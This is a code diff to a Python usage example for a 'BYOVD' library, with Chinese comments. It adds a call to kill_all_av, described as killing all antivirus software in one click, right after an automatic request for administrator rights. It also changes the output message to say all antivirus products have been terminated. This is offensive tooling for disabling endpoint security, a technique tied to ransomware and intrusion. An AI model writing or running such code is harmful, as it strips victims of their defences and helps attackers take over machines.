@@ -12,8 +12,8 @@ import os
 # 添加库路径
 sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
 
-# 导入库函数，包括自动提权功能
-from byovd_lib import BYOVD, request_elevation
+# 导入库函数，包括自动提权和一键杀软功能
+from byovd_lib import BYOVD, request_elevation, kill_all_av
 
 # 自动请求管理员权限
 request_elevation()
@@ -24,6 +24,12 @@ def main():
     print("=" * 50)
     print("BYOVD Library 使用示例")
     print("=" * 50)
+    print()
+    
+    # 一键秒杀所有杀毒软件
+    print("[*] 正在扫描并终结杀毒软件...")
+    print()
+    results = kill_all_av(verbose=True)
     print()
     
     with BYOVD() as byovd:
@@ -42,7 +48,7 @@ def main():
             for pid, name, av in av_list:
                 print(f"  {av}: {name} (PID: {pid})")
         else:
-            print("  未检测到杀毒软件")
+            print("  未检测到杀毒软件 (已全部终结)")
         print()
         
         # 3. 检查特定杀毒软件
